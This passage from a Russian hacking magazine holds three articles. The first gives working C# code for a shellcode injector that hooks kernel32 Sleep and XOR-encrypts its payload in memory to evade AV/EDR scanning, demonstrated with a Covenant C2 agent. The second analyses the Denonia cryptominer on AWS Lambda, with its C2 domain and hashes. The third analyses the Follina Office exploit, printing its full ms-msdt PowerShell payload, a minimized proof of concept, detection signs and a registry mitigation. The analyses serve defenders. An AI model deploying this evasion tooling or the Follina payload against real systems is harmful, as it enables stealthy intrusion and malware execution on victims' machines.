FluctuateShellcode смысловой нагрузкой. Будем идти по нашей «рыбе»
снизу вверх.


FluctuateShellcode.GenerateXorKey
Здесь все очевидно — сгенерируем последовательность байтов, которая
будет накладываться на байты шелл‑кода как шифрующая гамма. Помня
о несовершенстве первой версии техники Obfuscate and Sleep в Cobalt Strike,
из‑за которой присутствие бикона можно было распознать YARA-правилом,
основываясь на длине повторяющегося ключа, я реализую шифрование XOR
в режиме одноразового блокнота. В этом случае размер ключа равен раз‐
меру шифротекста, то есть длине шелл‑кода  (благо шелл‑коды обычно
небольшие, поэтому «лагов» и «фризов» быть не должно).


byte[] GenerateXorKey()
{
    Random rnd = new Random();
    byte[] xorKey = new byte[shellcodeLength];
    rnd.NextBytes(xorKey);
    return xorKey;
}


FluctuateShellcode.XorMemory
Пока тоже вроде нетрудно: накладываем шифрующую гамму на сегмент
памяти, содержащий байты шелл‑кода.


void XorMemory()
{
    byte[] data = new byte[shellcodeLength];
    Marshal.Copy(shellcodeAddress, data, 0, shellcodeLength);
    for (var i = 0; i < data.Length; i++) data[i] ^= xorKey[i];
    Marshal.Copy(data, 0, shellcodeAddress, data.Length);
}


FluctuateShellcode.ProtectMemory
В реализации этой функции выбор остается за читателем: либо используй
VirtualProtect из Win32 API с помощью P/Invoke, либо если хочешь быть самым
крутым хакером используй D/Invoke и системные вызовы, как мы делали это,
когда модернизировали KeeThief.
   Пример с P/Invoke:


void ProtectMemory(uint newProtect)
{
    if (Win32.VirtualProtect(shellcodeAddress, (uint)shellcodeLength,
newProtect, out _))
        Console.WriteLine("(FluctuateShellcode) [DEBUG]
Re-protecting at address " + string.Format("{0:X}", shellcodeAddress.
ToInt64()) + $" to {newProtect}");
    else
        throw new Exception("(FluctuateShellcode) [-] VirtualProtect"
);
}

Пример с D/Invoke:


[UnmanagedFunctionPointer(CallingConvention.StdCall)]
delegate DoItDynamicallyBabe.Native.NTSTATUS NtProtectVirtualMemory(
    IntPtr ProcessHandle,
    ref IntPtr BaseAddress,
    ref IntPtr RegionSize,
    uint NewProtect,
    ref uint OldProtect);


void ProtectMemory(uint newProtect)
{
    IntPtr stub = GetSyscallStub("NtProtectVirtualMemory");
    NtProtectVirtualMemory ntProtectVirtualMemory = (
NtProtectVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub,
typeof(NtProtectVirtualMemory));
    IntPtr protectAddress = shellcodeAddress;
    IntPtr regionSize = (IntPtr)shellcodeLength;
    uint oldProtect = 0;


    var result = ntProtectVirtualMemory(
        Process.GetCurrentProcess().Handle,
        ref protectAddress,
        ref regionSize,
        newProtect,
        ref oldProtect);


    if (ntstatus == NTSTATUS.Success)
        Console.WriteLine("(FluctuateShellcode) [DEBUG]
Re-protecting at address " + string.Format("{0:X}", shellcodeAddress.
ToInt64()) + $" to {newProtect}");
    else
        throw new Exception($"(FluctuateShellcode) [-]
NtProtectVirtualMemory: {ntstatus}");
}




                                     Продолжение статьи →
                                   ← НАЧАЛО СТАТЬИCOVERSTORY

        ФЛУКТУАЦИЯ
         ШЕЛЛ-КОДА
         ПИШЕМ ИНЖЕКТОР ДЛЯ ДИНАМИЧЕСКОГО
             ШИФРОВАНИЯ ПОЛЕЗНОЙ НАГРУЗКИ
                                  В ПАМЯТИ





FluctuateShellcode.DisableHook
Функция снятия хука — то есть перезапись трамплина содержимым ори‐
гинального Sleep, которое мы бережно храним в поле sleepOriginBytes.
И снова можно использовать P/Invoke или более модный D/Invoke для работы
с API.


public bool DisableHook()
{
    bool unhooked = false;
    if (Win32.VirtualProtect(
        sleepOriginAddress,
        (uint)sleepOriginBytes.Length,
        0x40, // 0x40 = PAGE_EXECUTE_READWRITE
        out uint oldProtect))
    {
        Marshal.Copy(sleepOriginBytes, 0, sleepOriginAddress,
sleepOriginBytes.Length);
        unhooked = true;
    }


    bool flushed = false;
    if (Win32.FlushInstructionCache(
        Process.GetCurrentProcess().Handle,
        sleepOriginAddress,
        (uint)sleepOriginBytes.Length))
    {
        flushed = true;
    }


    Win32.VirtualProtect(
        sleepOriginAddress,
        (uint)sleepOriginBytes.Length,
        oldProtect,
        out _);


    return unhooked && flushed;
}


             INFO

                            Если  мы  изменяем  код,  уже  загруженный
                        в  память,  Microsoft  говорит,  что мы  должны
                          использовать функцию FlushInstructionCache, —
                        в противном случае кеш ЦП может помешать ОС
                           увидеть изменения.



FluctuateShellcode.EnableHook
То же самое, что и DisableHook, только в этот раз мы перезаписываем
исходный Sleep трамплином:


public bool EnableHook()
{
    bool hooked = false;
    if (Win32.VirtualProtect(
        sleepOriginAddress,
        (uint)trampoline.Length,
        0x40, // 0x40 = PAGE_EXECUTE_READWRITE
        out uint oldProtect))
    {
        Marshal.Copy(trampoline, 0, sleepOriginAddress, trampoline.
Length);
        hooked = true;
    }


    bool flushed = false;
    if (Win32.FlushInstructionCache(
        Process.GetCurrentProcess().Handle,
        sleepOriginAddress,
        (uint)trampoline.Length))
    {
        flushed = true;
    }


    Win32.VirtualProtect(
        sleepOriginAddress,
        (uint)trampoline.Length,
        oldProtect,
        out _);


    return hooked && flushed;
}


FluctuateShellcode.SleepDetour
Сердце нашей флуктуации — измененная функция Sleep, которая будет
перехватывать управление в момент «засыпания» агента. По содержимому
тела функции понятно, что она делает.


void SleepDetour(uint dwMilliseconds)
{
    DisableHook();
    ProtectMemory(0x04); // 0x04 = PAGE_READWRITE
    XorMemory();


    sleepOrig(dwMilliseconds);


    XorMemory();
    ProtectMemory(0x20); // 0x20 = PAGE_EXECUTE_READ
    EnableHook();
}


Конструктор и деструктор
Так как мы решили пользоваться преимуществами ООП в C#, в конструкторе
мы реализуем вычисление необходимых адресов и содержимого, находя‐
щегося по этим адресам:


public FluctuateShellcode(IntPtr shellcodeAddr, int shellcodeLen)
{
    // Получаем адрес оригинальной функции Sleep
    sleepOriginAddress = Win32.GetProcAddress(Win32.LoadLibrary(
"kernel32.dll"), "Sleep");
    // Инициализируем делегат для возможности обращаться к этой
функции по ее адресу
    sleepOrig = (Sleep)Marshal.GetDelegateForFunctionPointer(
sleepOriginAddress, typeof(Sleep));


    // Бэкапим первые 16 байт оригинальной функции Sleep
    Marshal.Copy(sleepOriginAddress, sleepOriginBytes, 0, 16);


    // Получаем адрес метода SleepDetour, которым будет пропатчен
шаблон трамплина
    var sleepDetour = new Sleep(SleepDetour);
    sleepDetourAddress = Marshal.GetFunctionPointerForDelegate(
sleepDetour);
    gchSleepDetour = GCHandle.Alloc(sleepDetour);


    using (var ms = new MemoryStream())
    using (var bw = new BinaryWriter(ms))
    {
        // Составляем little-endian-адрес sleepDetourAddress в виде
байтового массива
        bw.Write((ulong)sleepDetourAddress);
        sleepDetourBytes = ms.ToArray();
    }


    // Патчим этим адресом шаблон трамплина
    for (var i = 0; i < sleepDetourBytes.Length; i++)
        trampoline[i + 2] = sleepDetourBytes[i];


    // Инициализируем другие оставшиеся поля класса
FluctuateShellcode, к которым должны иметь доступ его методы
    shellcodeAddress = shellcodeAddr;
    shellcodeLength = shellcodeLen;
    xorKey = GenerateXorKey();
}

Важный момент, на котором стоит остановиться отдельно: так как мы работа‐
ем с управляемой средой .NET, адрес метода SleepDetour будет недос‐
тупен для неуправляемого кода, если только мы явно не попросим его
таковым быть. Здесь на помощь приходит хендл GCHandle, дающий способ
получить доступ к управляемому объекту из неуправляемой памяти (подсмот‐
рел в этом ответе на Stack Overflow).
   Метод   GCHandle.Alloc   запрещает   сборщику   мусора    трогать
адрес‑делегат sleepDetourAddress, тем самым «фиксируя» его на все вре‐
мя работы инжектора. Чтобы отпустить удерживание адреса, мы используем
деструктор:


~FluctuateShellcode()
{
    if (gchSleepDetour.IsAllocated)
        gchSleepDetour.Free();


    DisableHook();
}


Тестирование
Время лабораторных испытаний. Чтобы успеть увидеть флипы и шифрование
памяти  в  Process  Hacker,  я  добавлю  инструкцию Thread.Sleep(5000)
в начало функции SleepDetour. Скомпилируем проект (обязательно в x64)
и запустим.
   Сперва смотрим на содержимое области памяти с шелл‑кодом, которое
шифруется при каждом вызове Sleep.





                 Обфускация области памяти с шелл‑кодом

Еще одно демо, на котором видна перезапись памяти kernel32.dll: трамплин
сменяется оригинальным содержимым и наоборот.





                          Установка и снятие хука Sleep

Тесты в контролируемой среде пройдены, время для полевых испытаний!


ИСПОЛЬЗОВАНИЕ С АГЕНТОМ C2
Для демонстрации работы инжектора с реальным C2 сперва нужно опре‐
делиться с фреймворком, который мы будем использовать. Показывать
работу флуктуатора с Cobalt Strike бессмысленно (хотя с ней он тоже работа‐
ет), ведь изначальной целью было научиться встраивать обсуждаемую тех‐
нику в open source проекты, да и sleep_mask в свежих версиях «Кобы»
работает как надо.
   Итак, какой же C2 нам выбрать? Агент Meterpreter полностью интерак‐
тивный и не использует Sleep (править сорцы Meterpreter — увольте, нет),
PoshC2 не имеет stageless-имплантов, и его код частично закрыт, а в Sliver
генерирует  слишком  большой  шелл‑код  из‑за  особенностей  языка,
на котором он написан (это Go, ага).
  Мой выбор пал на Covenant, для которого @ShitSecure недавно показал,
как создавать stageless-импланты. Отличный кандидат, как по мне!
  Я загружу код кастомного stageless-импланта и изменю в нем задержки
(Delays), реализованные через Thread.Sleep, на полноценный вызов Sleep
из kernel32.dll.





                       Thread.Sleep → kernel32!Sleep

Вот такой патч у меня получился, если кто‑то захочет повторить:


14a15
> using System.Runtime.InteropServices;
277a279,281
>         [DllImport("kernel32.dll")]
>         static extern void Sleep(int dwMilliseconds);
>
354c358
<                     Thread.Sleep((Delay + change) * 1000);
---
>                     Sleep((Delay + change) * 1000);
430c434
<                                     Thread.Sleep(3000);
---
>                                     Sleep(3000);

Далее я залогинюсь в Covenant и создам новый темплейт.





                  Добавление stageless-агента в Covenant

Теперь создаем новые Listener и Launcher в формате шелл‑кода на основе
добавленного темплейта.





                       Генерация шелл‑кода в Covenant

Остается заменить sleepDll.bin путем до нового шелл‑кода, и можно
запускать инжектор!





                      You’ve poped a (fluctuating) shell!

Если просканировать область памяти, содержащей шелл‑код, с помощью
Moneta, можно видеть, что мы избавились от одного из самых показательных
индикаторов заражения — исполняемой приватной памяти.





                  Никакого Abnormal private executable memory

И разумеется, я не мог не портировать созданный код на D/Invoke и не вклю‐
чить его в свой инжектор, который зачастую использую на проектах.





                                 Демо


БОНУС. РЕАЛИЗАЦИЯ API HOOKING С ПОМОЩЬЮ MINIHOOK.NET
В качестве бонуса оставлю здесь реализацию класса флуктуатора, которая
использует MiniHook.NET. Можешь сам оценить, сильно ли уменьшился объ‐
ем кода.


class FluctuateShellcodeMiniHook
{
    // using MinHook; // https://github.com/CCob/MinHook.NET


    delegate void Sleep(uint dwMilliseconds);
    readonly Sleep sleepOrig;
    readonly HookEngine hookEngine;


    readonly uint fluctuateWith;
    readonly IntPtr shellcodeAddress;
    readonly int shellcodeLength;
    readonly byte[] xorKey;


    public FluctuateShellcodeMiniHook(uint fluctuate, IntPtr
shellcodeAddr, int shellcodeLen)
    {
        hookEngine = new HookEngine();
        sleepOrig = hookEngine.CreateHook("kernel32.dll", "Sleep",
new Sleep(SleepDetour));


        fluctuateWith = fluctuate;
        shellcodeAddress = shellcodeAddr;
        shellcodeLength = shellcodeLen;
        xorKey = GenerateXorKey();
    }


    ~FluctuateShellcodeMiniHook()
    {
        hookEngine.DisableHooks();
    }


    public void EnableHook()
    {
        hookEngine.EnableHooks();
    }


    public void DisableHook()
    {
        hookEngine.DisableHooks();
    }


    void SleepDetour(uint dwMilliseconds)
    {
        ProtectMemory(fluctuateWith);
        XorMemory();


        sleepOrig(dwMilliseconds);


        XorMemory();
        ProtectMemory(DI.Data.Win32.WinNT.PAGE_EXECUTE_READ);
    }


    void ProtectMemory(uint newProtect)
    {
        if (Win32.VirtualProtect(shellcodeAddress, (uint)
shellcodeLength, newProtect, out _))
            Console.WriteLine("(FluctuateShellcodeMiniHook) [DEBUG]
Re-protecting at address " + string.Format("{0:X}", shellcodeAddress.
ToInt64()) + $" to {newProtect}");
        else
            throw new Exception("(FluctuateShellcodeMiniHook) [-]
VirtualProtect");
    }


    void XorMemory()
    {
        byte[] data = new byte[shellcodeLength];
        Marshal.Copy(shellcodeAddress, data, 0, shellcodeLength);
        for (var i = 0; i < data.Length; i++) data[i] ^= xorKey[i];
        Marshal.Copy(data, 0, shellcodeAddress, data.Length);
    }


    byte[] GenerateXorKey()
    {
        Random rnd = new Random();
        byte[] xorKey = new byte[shellcodeLength];
        rnd.NextBytes(xorKey);
        return xorKey;
    }
}


ВЫВОДЫ
Мы разобрали базовые основы техники Inline API Hooking и портировали
инжектор флуктуирующего шелл‑кода на C# для обхода сигнатурного ска‐
нирования памяти.
   Замечу, что разобранный код все еще остается «доказательством кон‐
цепции» и не стоит ожидать от него волшебных возможностей обхода зрелых
AV и EDR прямо «из коробки» (все же мы использовали наиболее банальную
технику инжекта). Можешь обратить внимание на более продвинутые техники
инжекта шелл‑кода, как, например, Module Stomping или ThreadStackSpoofer,
и комбинировать их с техникой флуктуирующего шелл‑кода.
  В завершение — минутка саморекламы (да простит меня главред). Недав‐
но я завел канал в Telegram с репостами новостей из твиттера на тему нас‐
тупательной безопасности, так что милости просим.
ВЗЛОМ
 DENONIA





    КАК РАБОТАЕТ ПЕРВЫЙ ВРЕДОНОС,
     НАЦЕЛЕННЫЙ НА AWS LAMBDA




Сегодняшняя статья затрагивает малоизу‐
ченную тему — разработку вредоносного
ПО на языке Go. Обычно он используется
для системного программирования. Одна‐
ко мы поговорим о вирусе, нацеленном          Олег Сивченко                                                                                              adrelian@gmail.com
на  облачные  инфраструктуры,  которые
позиционируются как «бессерверные». Их
популярность растет, и, конечно же, хакеры
ищут подходы к их эксплуатации.


«Бессерверный» — это не более чем фигура речи. У систем вроде AWS
Lambda есть серверная часть, и она работает на Linux. Однако разработчиков
это в теории не касается. Для них применение Lambda экономит время, пос‐
кольку поддержка системы ложится на Amazon. В теории остается только
писать код и не задумываться ни о чем. Впрочем, думать о безопасности все
же придется.
   Эфемерность  и  динамичность,  присущие  лямбда‑функциям,  могут
осложнить  обнаружение и митигацию  угроз. Помочь с этим  призваны
решения вроде тех, что предоставляет Cado Labs. Последнее исследование
этой компании мы с тобой сегодня изучим.
   Итак, в Cado Labs  обнаружили  вредонос, атакующий  аккаунты AWS
Lambda. Он получил имя Denonia — по названию того домена, с которым
обменивается информацией. Вредонос использует новейшие приемы раз‐
решения адресов для взаимодействия с C2, что позволяет ему ускользать
от типичных механизмов обнаружения.
   Denonia в целом безобиден — он  всего‑навсего  гоняет программу
для майнинга криптовалюты. Распространен он пока, по данным Cado Labs,
тоже не слишком широко. Однако Denonia демонстрирует потенциал эксплу‐
атации окружений Lambda, результат которой может оказаться и более гнус‐
ным.


ТЕХНИЧЕСКИЙ АНАЛИЗ
Впервые образец Denonia был найден на ресурсе с таким хешем SHA-256:
   a31ae5b7968056d8d99b1b720a66a9a1aeee3637b97050d95d96ef3a265cbb
ca
    Хотя в имени файла присутствует python, на самом деле этот вредонос
написан на Go и, по‑видимому, содержит кастомизированный вариант май‐
нингового софта XMRig, а также обладает другими невыясненными функци‐
ями. Вот что показало более тщательное исследование.
  Во время динамического анализа вредонос быстро прекратил выполнять‐
ся и выдал в лог следующую ошибку.





Такие переменные окружений специфичны для «лямбд» — поэтому отчасти
позволяют судить о показателях той среды, для выполнения в которой пред‐
назначен этот вирус. Дальнейший анализ бинарника выявил, что это 64-раз‐
рядный исполняемый файл ELF для архитектуры x86-64. Вредонос также
использует ряд сторонних библиотек, среди которых есть и AWS Lambda for
Go. Она предназначена для выполнения в окружениях AWS Lambda.


ВРЕДОНОСЫ НА GO
Вредоносное ПО, написанное на языке Go, стремительно набирает популяр‐
ность. Этот язык привлекает разработчиков вредоносов сразу по нескольким
причинам — в том числе потому, что на нем чрезвычайно просто писать
кросс‑платформенные исполняемые файлы. К тому же программы на Go ста‐
тически слинкованы, что облегчает деплой.
   Вирусным аналитикам, столкнувшимся с малварью на Go, нужно знать
о  некоторых  особенностях.  Из‑за  статической  связанности  бинарники
получаются большими, что затрудняет статический анализ. Кроме того, Go
своеобразно обращается со строками. Они не завершаются нулем — в отли‐
чие от того, как принято в С‑образных языках. Строки здесь представляют
собой большой блоб и структуру с указателем на строку в блобе и целым чис‐
лом, которое означает длину строки. Это может запутать некоторые инстру‐
менты статического анализа.


АНАЛИЗ ЛЯМБДА-ВРЕДОНОСОВ
У анализа бинарника, предназначенного для запуска на AWS Lambda, тоже
есть ряд особенностей.
   Denonia явно  спроектирована для выполнения в  лямбда‑окружениях,
но мы пока не знаем, как именно она развертывается. Возможно, от нее все‐
го‑то и требуется скомпрометировать доступ к AWS и секретные ключи, после
чего злоумышленник вручную развернет ее в скомпрометированном лям‐
бда‑окружении, как уже делали с более простыми скриптами на Python.
   Инструмент redress позволил выявить некоторые интересные сторонние
библиотеки Go, встраиваемые этим вредоносом. По ним можно частично
вывести, как именно он функционирует:
 • lambda —  библиотеки, образцы и  инструменты для написания лям‐
   бда‑функций на Go;
 • lambdacontext — вспомогательные функции для извлечения контекстной
   информации из запроса, активирующего лямбда‑функцию;
 • aws — общий инструментарий AWS SDK для языка Go;
 • doh-go — клиент DNS over HTTPS на Go, поддерживает такие провайдеры,
   как Quad9, Cloudflare и прочие.

Ниже приведен фрагмент обработчика лямбда‑функций — он ожидает, что
будут установлены определенные данные.





Несмотря на его наличие, динамический анализ показывает, что этот образец
с тем же успехом продолжает выполняться и вне лямбда‑окружения (нап‐
ример, на самой обычной машине Amazon Linux). Предположительно дело
в том, что «бессерверные» лямбда‑окружения под капотом все равно исполь‐
зуют Linux, так что вредонос просто считает, что он внутри лямбда‑окружения,
хотя на самом деле его гоняли в песочнице. Для этого достаточно вручную
установить нужные переменные окружения.


DNS ПО HTTPS
Как правило, при запросе доменного имени, например google.com, отправ‐
ляется незашифрованный DNS-запрос, позволяющий найти тот IP-адрес,
в который разрешается домен, — и тогда твоя машина подключается к этому
домену. Сравнительно новая замена для обычного DNS — это DNS по HTTPS
(DoH). DoH шифрует запросы DNS и рассылает их службам разрешения DoH
как обычный трафик HTTPS.
   Прибегнуть к DoH, прямо скажем, экзотический ход для авторов Denonia,
но в данном случае он обеспечивает два преимущества:
 • AWS не сможет увидеть, что по DNS ищется вредоносный домен, — поэто‐
   му снижается вероятность, что в системе сработает тревога и вирус
   попытаются обнаружить;
 • в некоторых лямбда‑окружениях может не быть возможности выполнять
   поиск по DNS (зависит от настроек VPC).

Видно, как вредонос при отправке этих запросов полагается на библиотеку
doh-go и по каким именно урлам это делается, например:
 • https://cloudflare-dns.com/dns-query?name=gw.denonia.xyz&type=A
 • https://dns.google.com/resolve?name=gw.denonia.xyz&type=A





                  HTTPS-запрос на сервер Google DoH

А DoH-сервер (в данном случае Google) выдает в ответ IP-адрес домена,
который разрешается в JSON.





ЗАПИСЬ В /TMP/.XMRIG.JSON ДЛЯ XMRIG
Домен gw.denonia[.]xyz, контролируемый злоумышленником, разрешается
в 116.203.4[.]0 — и этот адрес затем записывается в конфиг для майнера
XMRig по адресу /tmp/.xmrig.json.





Обрати внимание: в AWS Lambda можно записывать только в один каталог,
а именно в /tmp. Бинарник также устанавливает в качестве домашнего
каталога именно /tmp, это делается при помощи команды HOME=/tmp. Сам
XMRig выполняется из памяти.


КОММУНИКАЦИЯ С СЕРВЕРОМ MONERO ПО АДРЕСУ 116.203.4[.]0
Затем Denonia запускает XMRig из памяти и обменивается информацией
с майнинговым пулом, которым уже завладел злоумышленник, по адресу 116.
203.4[.]0:3333.





В ответ получаем состояние майнингового задания.





По мере выполнения XMRig пишет в консоль.





ВЫВОДЫ
Итак, на примере Denonia мы посмотрели, как обращаться с вредоносами,
написанными на Go, а также нацеленными на исполнение в лямбда‑окру‐
жениях.
   Интересно, что это не единственный обнаруженный образец Denonia. Рас‐
смотренный образец датируется концом февраля 2022 года, но с того
момента был найден и второй, загруженный на VirusTotal в январе:
   739fe13697bc55870ceb35003c4ee01a335f9c1f6549acb6472c5c3078417eed
   Подробнее о защите окружений AWS Lambda ты можешь почитать в науч‐
ной статье сотрудников AWS (PDF).
ВЗЛОМ
OH, FOLLINA!





             ИЗУЧАЕМ
     НАШУМЕВШУЮ УЯЗВИМОСТЬ
        В MICROSOFT OFFICE





«Фо́ллина‑фо́ллина,     фо́ллина‑фолли́на,
фой‑на‑на!» — весело распевают хакеры,
воспользовавшиеся уязвимостью нулевого
дня для  Microsoft  Office под  названием
Follina. Причины для радости очевидны: баг       Валентин Холмогоров                                                                           Ведущий редактор "Хакера".
содержится во всех  актуальных  версиях          valentin@holmogorov.ru
Office,  начиная  с  2013,  и  открывает
широчайшие   возможности   напакостить
юзеру. Официального патча сейчас поп‐
росту не существует. О том, как работает
«фоллическая» уязвимость, как она была
обнаружена и как защититься от ее эксплу‐
атации, мы сегодня и поговорим.


Follina по‑своему уникальна. Она не требует активации макросов, при этом
позволяет выполнять произвольный код с привилегиями вызывающего при‐
ложения. Теоретически запущенный вредонос может изрядно порезвиться
в скомпрометированной системе: устанавливать программы, просматривать,
изменять или удалять данные, а еще — создавать новые учетные записи.
Причем корпорацию Microsoft оперативно предупредили, что обнаружена
зияющая дыра в безопасности Office, но компания не предприняла по этому
поводу никаких мер, посчитав угрозу несерьезной. Как выяснилось, очень
напрасно.
   Проблема  скрывается в Microsoft Diagnostic Tool (MSDT) —  утилите,
которая собирает информацию для отправки в службу технической поддер‐
жки Microsoft и формирует отчеты об ошибках. Любопытно, что эксплоит мож‐
но использовать даже без открытия документа Microsoft Word, для этого дос‐
таточно лишь навести курсор мыши на загруженный файл в проводнике: вре‐
доносный скрипт сработает в превью документа. Однако обо всем по поряд‐
ку.
   Первым файл с эксплоитом обнаружил на VirusTotal исследователь, скры‐
вающийся под псевдонимом nao_sec: документ был загружен на VT в апре‐
ле 2022 года с белорусского IP-адреса. Следом за изучение опасного файла
взялся IT-эксперт Кевин Бомонт и опубликовал в своем блоге подробное
описание уязвимости. Он же дал ей название: расшифрованный им образец
кода в файле включал ссылку на RAR-архив с именем 05-2022-0438.rar,
а 0438 — это телефонный код итальянского городка Follina. Если открыть
документ с эксплоитом, этот RAR-архив скачивается на атакуемый компьютер
и сохраняется во временную папку.





             Та самая ссылка, давшая название уязвимости

О том, как работает эта уязвимость, получившая в итоге обозначение CVE-
2022-30190, подробно рассказывали в исследовании эксперты из Huntress.
При распаковке файла с эксплоитом они получили все компоненты, составля‐
ющие документ Microsoft Office.





  Компоненты, составляющие вредоносный документ. Иллюстрация с сай‐
  та huntress.com

Среди этих составляющих в папке word/_rels/ расположен стандартный
XML-файл  document.xml.rels,  в  котором  содержится  список  связей
для основного XML-файла word/document.xml. В document.xml сосредото‐
чено полезное содержимое документа Word, и, если он не имеет связей
с внешними объектами или ресурсами, файл document.xml.rels обычно
пуст. В нашем случае там содержался код, включающий ссылку на некую
внешнюю  веб‑страницу,  расположенную  по  адресу  hxxps[:]//www.
xmlformats.com/office/word/2022/wordprocessingDrawing/RDF842l.
html.





                   Код в файле document.xml.rels

Сейчас сайт, где лежал файл, уже недоступен, но некоторое время назад
исследователям все же удалось скачать с него ту самую веб‑страницу. Этот
HTML-документ содержал тег <script> и большое количество закомменти‐
рованных символов А.





                     Содержимое файла RDF842l.html

Изначально исследователи не могли понять, для чего нужны эти закомменти‐
рованные строки, но без них эксплоит не работал. Парни из Huntress испро‐
бовали множество вариантов: разные символы, размещение закомменти‐
рованного блока выше или ниже полезной нагрузки, пока не обнаружилось,
что функция обработки HTML-модуля MSDT имеет жестко закодированный
размер буфера и для срабатывания эксплоита объем вредоносного файла
должен превышать 4096 байт.
  В нижней части HTML-кода содержался зашифрованный скрипт, в котором
и реализован основной код эксплоита:


window.location.href = "ms-msdt:/id PCWDiagnostic /skip force /param
"IT_RebrowseForFile=cal?c IT_LaunchMethod=ContextMenu IT_
SelectProgram=NotListed IT_BrowseForFile=h$(Invoke-Expression($(
Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.
GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[
char]
34+'JGNtZCA9ICJjOlx3aW5kb3dzXHN5c3RlbTMyXGNtZC5leGUiO1N0YXJ0LVByb2Nlc
3MgJGNtZCAtd2luZG93c3R5bGUgaGlkZGVuIC1Bcmd1bWVudExpc3QgIi9jIHRhc2traW
xsIC9mIC9pbSBtc2R0LmV4ZSI7U3RhcnQtUHJvY2VzcyAkY21kIC13aW5kb3dzdHlsZSB
oaWRkZW4gLUFyZ3VtZW50TGlzdCAiL2MgY2QgQzpcdXNlcnNccHVibGljXCYmZm9yIC9y
ICV0ZW1wJSAlaSBpbiAoMDUtMjAyMi0wNDM4LnJhcikgZG8gY29weSAlaSAxLnJhciAve
SYmZmluZHN0ciBUVk5EUmdBQUFBIDEucmFyPjEudCYmY2VydHV0aWwgLWRlY29kZSAxLn
QgMS5jICYmZXhwYW5kIDEuYyAtRjoqIC4mJnJnYi5leGUiOw=='+[
char]34+'))'))))i/../../../../../../../../../../../../../../Windows/
System32/mpsigstub.exe IT_AutoTroubleshoot=ts_AUTO"";!

Действует  он  следующим  образом. С  использованием  стандартного
механизма Microsoft Diagnostic Tool вызывается встроенная в Windows утилита
поиска  неполадок  PCWDiagnostic  с  параметром  просмотра  файла
IT_BrowseForFile, в качестве которого ей подсовывается скрипт PowerShell,
спрятанный в параметре $(). После расшифровки из Base64 этот скрипт
имеет такой вид:


$cmd = "c:\windows\system32\cmd.exe";
Start-Process $cmd -windowstyle hidden -ArgumentList "/c taskkill /
f /im msdt.exe";
Start-Process $cmd -windowstyle hidden -ArgumentList "/c cd C:\users\
public\&&for /r %temp% %i in (05-2022-0438.rar) do copy %i 1.rar /y&&
findstr TVNDRgAAAA 1.rar>1.t&&certutil -decode 1.t 1.c &&expand 1.c
-F:* .&&rgb.exe";

Если записанный в переменную $cmd путь к командному интерпретатору cmd.
exe верен, скрипт запускается в командной строке и открывает невидимые
окна, в которых выполняются следующие действия:
 • убивается процесс msdt.exe, если он запущен;
 • в ранее скачанном архиве 05-2022-0438.rar ищется строка Base64,
   в которой хранится зашифрованный CAB-файл;
 • этот файл извлекается и сохраняется под именем 1.t;
 • сохраненный файл расшифровывается и сохраняется в текущий каталог
   под именем 1.c;
 • вызывается на исполнение приложение rgb.exe, которое предположи‐
   тельно хранилось внутри CAB-файла 1.c. Назначение этого приложения
   в  данный момент  неизвестно,  поскольку  сайт, с  которого  грузился
   исходный архив, больше не доступен.

Чтобы лучше понять, как работает эксплоит, исследователи заменили вызов
несуществующего приложения демонстрацией окошка с системным уведом‐
лением — вот как сработавший эксплоит выглядел в их виртуалке.





                  Наглядная демонстрация работы Follina

Последующие  эксперименты  показали,  что  некоторые  синтаксические
выражения в коде Follina совсем необязательны для выполнения полезной
нагрузки, и исследователям из Huntress удалось значительно оптимизировать
код эксплоита, сократив его до следующей лаконичной конструкции:


location.href = "ms-msdt:/id PCWDiagnostic /skip force /param "
IT_RebrowseForFile= ? IT_LaunchMethod=ContextMenu IT_BrowseForFile=
/../../$( calc) /.exe"";

Наиболее важными для успешного выполнения кода оказались следующие
моменты:
 • в начале параметра IT_BrowseForFile требуется как минимум два
   обхода каталога /.../;
 • код, обернутый в $(), выполнялся через PowerShell, но пробелы нарушают
   его работу;
 • расширение .exe должно быть последним завершающим значением
   в конце параметра IT_BrowseForFile.

Таким  образом,  Follina  позволяет  запустить  в  системе  произвольный
исполняемый файл, притом для  этого необязательно отключать в Word
защиту от выполнения макросов, поскольку уязвимость эксплуатирует совер‐
шенно другой механизм. Баг присутствует в версиях Office 2013, 2016, Office
Pro Plus апрельской версии (Windows 11 с майскими обновлениями) и версии
Office 2021 со всеми патчами. Вот пример содержащего эксплоит документа,
который рассылали в почтовом спаме.





         Пример вредоносного документа, содержащего эксплоит

Правда, при  срабатывании  эксплоита в  Microsoft  Office  активизируется
защита Protected View, демонстрирующая содержимое потенциально опас‐
ного документа в режиме «только для чтения», но ее можно обойти, сохранив
файл с эксплоитом в формате RTF. Более того: в этом случае его даже не нуж‐
но открывать в Word — этот эксплоит будет вызван уже в момент появления
превью  документа  в  панели  предварительного  просмотра  проводника
Windows.





   Follina срабатывает при просмотре превью вредоносного документа
  в проводнике

Есть и еще один очень важный момент: полезная нагрузка может обращаться
к удаленным узлам, принадлежащим злоумышленникам. При таком соеди‐
нении на удаленный узел будет передаваться хеш NTLM, а это означает, что
киберпреступники получат хеш пароля Windows жертвы, который может быть
использован для дальнейшей постэксплуатации.





               При соединении передается хеш NTLM

Эта техника атаки запускает код под учетной записью пользователя, который
открыл вредоносный документ или просмотрел его в проводнике. Иными сло‐
вами, злоумышленник начнет атаку как пользователь с низкими привилегиями
(без прав  администратора), но затем может использовать этот  доступ
для дальнейших атак, чтобы повысить привилегии и получить расширенный
доступ к целевой среде.
   Подытоживая, можно сказать, что на твоем компе сработала Follina, если
наблюдаются следующие тревожные признаки:
 • процесс Microsoft Word создает дочерний процесс msdt.exe;
 • запущен процесс sdiagnhost.exe с дочерним процессом conhost.
  exe.





        Характерные признаки срабатывания полезной нагрузки Follina

Любопытно, что корпорация Microsoft была своевременно проинформирова‐
на об этой  уязвимости, но  посчитала,  что она «не  имеет отношения
к  безопасности», —  соответствующую  переписку  опубликовал  участник
Shadow Chaser Group (ассоциация  студентов колледжей, занимающаяся
поиском и анализом APT) crazyman.





           Скрин переписки пользователя crazyman и Microsoft

Без патча единственным разумным способом противостоять Follina было уда‐
ление ассоциации для файлов MS-MSDT в реестре Windows, за которую отве‐
чает ветвь HKCR:\ms-msdt. Это можно сделать с помощью команды reg
delete  HKEY_CLASSES_ROOT\ms-msdt  /f или с использованием скрипта
на PowerShell от Кельвина Тегелара. В таком случае сработавший эксплоит
не сможет вызвать MS-MSDT, что предотвратит запуск вредоносной прог‐
раммы.
